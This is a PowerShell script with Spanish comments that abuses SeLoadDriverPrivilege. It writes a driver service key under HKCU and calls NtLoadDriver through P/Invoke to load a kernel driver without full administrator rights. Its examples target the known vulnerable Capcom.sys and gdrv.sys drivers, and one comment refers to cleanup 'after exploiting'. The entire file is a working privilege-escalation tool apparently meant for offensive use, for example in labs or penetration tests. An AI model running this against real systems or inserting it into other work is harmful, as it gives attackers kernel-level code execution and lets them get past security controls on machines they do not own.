<#
.SYNOPSIS
    Carga/descarga un driver de kernel usando SeLoadDriverPrivilege vía HKCU.
    No requiere admin completo (solo el privilegio SeLoadDriverPrivilege).
.PARAMETER DriverPath
    Ruta absoluta del .sys en el sistema (ej: C:\Users\user\Capcom.sys).
.PARAMETER ServiceName
    Nombre de la clave de servicio en HKCU. Por defecto: nombre del .sys sin extensión.
.EXAMPLE
    Invoke-LoadDriver -DriverPath C:\Users\svc-print\Documents\Capcom.sys
.EXAMPLE
    Invoke-LoadDriver -DriverPath C:\Users\svc-print\Documents\gdrv.sys -ServiceName Gdrv
.EXAMPLE
    Invoke-UnloadDriver -ServiceName Capcom
#>

# ---------- P/Invoke: una sola vez por sesión ----------
if (-not ("NtDrv" -as [type])) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NtDrv {
    [StructLayout(LayoutKind.Sequential)]
    public struct UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }
    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    public static extern int NtLoadDriver(ref UNICODE_STRING DriverServiceName);
    [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
    public static extern int NtUnloadDriver(ref UNICODE_STRING DriverServiceName);
    [DllImport("ntdll.dll")]
    public static extern int RtlAdjustPrivilege(int Privilege, bool bEnable, bool IsThread, out bool Prev);

    private static UNICODE_STRING MakeUS(string s) {
        UNICODE_STRING us = new UNICODE_STRING();
        us.Buffer = Marshal.StringToHGlobalUni(s);
        us.Length = (ushort)(s.Length * 2);
        us.MaximumLength = (ushort)(us.Length + 2);
        return us;
    }
    public static int Load(string path) {
        UNICODE_STRING us = MakeUS(path);
        int r = NtLoadDriver(ref us);
        Marshal.FreeHGlobal(us.Buffer);
        return r;
    }
    public static int Unload(string path) {
        UNICODE_STRING us = MakeUS(path);
        int r = NtUnloadDriver(ref us);
        Marshal.FreeHGlobal(us.Buffer);
        return r;
    }
}
"@
}

# ---------- Funciones ----------
function Enable-SeLoadDriverPrivilege {
    $prev = $false
    # 10 = SeLoadDriverPrivilege
    [void][NtDrv]::RtlAdjustPrivilege(10, $true, $false, [ref]$prev)
}

function Get-CurrentUserSid {
    # Más fiable que $env:USERNAME: saca el SID del token real
    return (whoami /user | Select-String -Pattern 'S-1-5-21-\S+').Matches.Value
}

function Invoke-LoadDriver {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)][string]$DriverPath,
        [string]$ServiceName
    )

    if (-not (Test-Path $DriverPath)) {
        Write-Error "Driver no encontrado: $DriverPath"; return
    }
    $DriverPath = (Resolve-Path $DriverPath).Path
    if (-not $ServiceName) { $ServiceName = [IO.Path]::GetFileNameWithoutExtension($DriverPath) }

    $sid = Get-CurrentUserSid
    Write-Host "[*] SID: $sid"
    Write-Host "[*] Driver: $DriverPath"
    Write-Host "[*] ServiceName: $ServiceName"

    # 1. Clave en HKCU (escribible sin elevación)
    $regPath = "HKCU:\System\CurrentControlSet\$ServiceName"
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name ImagePath -Value "\??\$DriverPath"
    Set-ItemProperty -Path $regPath -Name Type -Value 1 -Type DWord
    Write-Host "[*] Clave creada: HKCU\System\CurrentControlSet\$ServiceName"

    # 2. Privilegio
    Enable-SeLoadDriverPrivilege
    Write-Host "[*] SeLoadDriverPrivilege habilitado"

    # 3. Carga
    $ntPath = "\Registry\User\$sid\System\CurrentControlSet\$ServiceName"
    $status = [NtDrv]::Load($ntPath)

    switch ($status) {
        0          { Write-Host "[+] Driver cargado (STATUS_SUCCESS)" -ForegroundColor Green }
        0xC000010E { Write-Host "[!] STATUS_IMAGE_ALREADY_LOADED: ya estaba cargado (zombi). Usa Invoke-UnloadDriver o reinicia." -ForegroundColor Yellow }
        0xC000036B { Write-Host "[-] STATUS_DRIVER_BLOCKED: bloqueado por HVCI/lista negra." -ForegroundColor Red }
        0xC0000428 { Write-Host "[-] STATUS_INVALID_IMAGE_HASH: firma inválida." -ForegroundColor Red }
        0xC0000034 { Write-Host "[-] STATUS_OBJECT_NAME_NOT_FOUND: SID incorrecto o clave inexistente." -ForegroundColor Red }
        default    { Write-Host ("[-] Fallo: 0x{0:X8}" -f $status) -ForegroundColor Red }
    }
    return $status
}

function Invoke-UnloadDriver {
    [CmdletBinding()]
    param([Parameter(Mandatory=$true)][string]$ServiceName)

    $sid = Get-CurrentUserSid
    $ntPath = "\Registry\User\$sid\System\CurrentControlSet\$ServiceName"
    Enable-SeLoadDriverPrivilege
    $status = [NtDrv]::Unload($ntPath)

    switch ($status) {
        0          { Write-Host "[+] Driver descargado (STATUS_SUCCESS)" -ForegroundColor Green }
        0xC0000034 { Write-Host "[!] STATUS_OBJECT_NAME_NOT_FOUND: ya estaba descargado / clave limpiada (normal tras explotar)." -ForegroundColor Yellow }
        0xC000010E { Write-Host "[!] STATUS_IMAGE_ALREADY_LOADED: el kernel lo mantiene pillado (zombi)." -ForegroundColor Yellow }
        default    { Write-Host ("[-] Fallo: 0x{0:X8}" -f $status) -ForegroundColor Red }
    }
    return $status
}
